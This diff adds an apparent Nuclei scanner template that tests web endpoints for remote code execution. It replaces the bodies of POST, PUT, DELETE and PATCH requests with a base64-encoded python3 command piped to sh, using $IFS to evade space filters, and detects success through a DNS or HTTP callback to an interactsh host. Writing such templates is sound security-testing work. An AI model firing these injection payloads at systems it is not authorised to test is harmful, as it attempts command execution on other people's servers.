@@ -1,0 +1,41 @@
+id: rce-python-body
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,rce,dast
+  
+variables:
+  python_payload: "python3 -c 'import socket;socket.gethostbyname(\"{{interactsh-url}}\")'"
+  python_rce: "echo {{base64(python_payload)}}|base64$IFS-d|sh"
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        condition: or
+        
+    payloads:
+      rce:
+        - "{{python_rce}}"
+        
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
